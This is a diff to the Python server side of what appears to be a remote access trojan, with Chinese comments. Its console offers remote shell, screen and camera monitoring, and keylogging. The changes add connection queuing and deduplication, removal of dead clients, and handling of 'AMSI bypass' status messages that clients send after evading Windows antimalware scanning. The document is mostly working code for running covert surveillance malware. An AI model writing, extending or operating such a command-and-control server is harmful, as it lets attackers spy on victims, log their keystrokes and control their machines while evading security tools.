@@ -18,6 +18,7 @@ import numpy as np
 import pickle
 import tkinter
 from tkinter import filedialog
+import queue
 # ============================================================================
 # 第一部分：服务端初始化
 # ============================================================================
@@ -58,21 +59,105 @@ def accept_clients():
         try:
             # 阻塞等待客户端连接
             client, addr = backend.accept()
-            print(f"\n[+] 新客户端已连接：{addr}")
+            # 放入消息队列，由主线程在菜单循环中统一打印，避免干扰 input()
+            pending_messages.put(f"[+] 新客户端已连接：{addr}")
             # 加锁后添加到全局列表，保证线程安全
             with list_lock:
+                # 同 IP 去重：如果该 IP 已有旧连接，关闭并替换，防止重连累积
+                for i, (old_cli, old_addr) in enumerate(client_list):
+                    if old_addr[0] == addr[0]:
+                        try:
+                            old_cli.close()
+                        except Exception:
+                            pass
+                        pending_messages.put(f"[-] 客户端 {old_addr} 被新连接替换")
+                        client_list.pop(i)
+                        break
                 client_list.append((client, addr))
         except Exception:
             # accept 出错（如 socket 被关闭），退出循环
             break
+
+# 线程安全消息队列：后台线程将连接消息放入队列，主线程在菜单循环中统一打印
+pending_messages = queue.Queue()
+
+# 记录已消耗过 AMSI 数据的客户端 socket id，list 预读后操作时跳过
+amsi_consumed = set()
+amsi_consumed_lock = threading.Lock()
 
 # 启动后台接收线程（daemon=True 表示主线程退出时自动结束）
 threading.Thread(target=accept_clients, daemon=True).start()
 
 
 # ============================================================================
-# 第三部分：工具函数 —— 安全地接收指定长度的数据
+# 第三部分：工具函数
 # ============================================================================
+
+def cleanup_dead_clients():
+    """
+    检测并移除 client_list 中已断开的客户端。
+    使用 MSG_PEEK 非阻塞探测，不消费缓冲区数据。
+    清理时通过 pending_messages 通知主线程在菜单循环中统一打印。
+    """
+    with list_lock:
+        alive = []
+        for cli, addr in client_list:
+            try:
+                cli.settimeout(0)
+                # MSG_PEEK 窥看 1 字节但不消费，用于检测 socket 存活
+                peek = cli.recv(1, socket.MSG_PEEK)
+                if peek == b'':
+                    # recv 返回空字节 = 对方已关闭
+                    raise ConnectionError("客户端已断开")
+                cli.settimeout(None)
+                alive.append((cli, addr))
+            except socket.timeout:
+                # 超时 = socket 存活但无数据，是正常状态
+                cli.settimeout(None)
+                alive.append((cli, addr))
+            except BlockingIOError:
+                # 非阻塞下无数据可读 = 存活
+                cli.settimeout(None)
+                alive.append((cli, addr))
+            except (ConnectionError, OSError):
+                # 连接已断开，关闭并丢弃
+                try:
+                    cli.close()
+                except Exception:
+                    pass
+                pending_messages.put(f"[-] 客户端 {addr} 已断开，已自动移除")
+        # 用切片赋值原地替换列表
+        client_list[:] = alive
+
+
+def try_consume_amsi(cli, addr):
+    """
+    尝试从客户端读取 AMSI 状态消息。
+    如果读到非空数据，打印并发送 ACK，返回 True。
+    如果超时（无 AMSI 数据），返回 False。
+    已消费的客户端会记录到 amsi_consumed，避免重复消费。
+    """
+    with amsi_consumed_lock:
+        if id(cli) in amsi_consumed:
+            return True  # 之前已消费过，跳过
+    cli.settimeout(0.3)
+    try:
+        data = cli.recv(4096)
+        text = data.decode(errors='ignore').strip()
+        if text:
+            print(f"[{addr}] AMSI: {text}")
+            cli.sendall(b'ACK')
+            with amsi_consumed_lock:
+                amsi_consumed.add(id(cli))
+            return True
+    except socket.timeout:
+        pass
+    except OSError:
+        pass
+    finally:
+        cli.settimeout(None)
+    return False
+
 
 def recv_exact(sock, length):
     """
@@ -462,6 +547,17 @@ def admin_console():
     提供菜单让用户选择操作：列出客户端、Shell、屏幕监控、摄像头监控、键盘记录。
     """
     while True:
+        # --- 清理已断开的客户端 ---
+        cleanup_dead_clients()
+
+        # --- 打印后台线程积累的待处理消息（避免干扰 input()） ---
+        try:
+            while True:
+                msg = pending_messages.get_nowait()
+                print(msg)
+        except queue.Empty:
+            pass
+
         # --- 显示菜单 ---
         print("\n" + "=" * 50)
         print("              远程管理控制台")
@@ -484,6 +580,14 @@ def admin_console():
         parts = cmd_input.split()
         base_cmd = parts[0]
 
+        # --- 执行命令前再消耗一次消息队列，把 input() 等待期间积压的消息先打印出来 ---
+        try:
+            while True:
+                msg = pending_messages.get_nowait()
+                print(msg)
+        except queue.Empty:
+            pass
+
         # ================================================================
         # 命令：list —— 列出所有已连接的客户端
         # ================================================================
@@ -495,6 +599,8 @@ def admin_console():
                     print(f"\n在线客户端（共 {len(client_list)} 个）：")
                     for i, (cli, addr) in enumerate(client_list):
                         print(f"  [{i + 1}] {addr}")
+                        # 顺便读取 AMSI 状态（不阻塞列表显示）
+                        try_consume_amsi(cli, addr)
 
         # ================================================================
         # 命令：shell / screen / camera
@@ -516,6 +622,11 @@ def admin_console():
                     continue
                 # 获取目标客户端的 socket 和地址
                 target_client, addr = client_list[idx]
+
+            # ============================================================
+            # 消耗客户端连接时发送的 AMSI 绕过结果，防止干扰后续协议解析
+            # ============================================================
+            try_consume_amsi(target_client, addr)
 
             # 根据命令分发到对应的处理函数
             try:
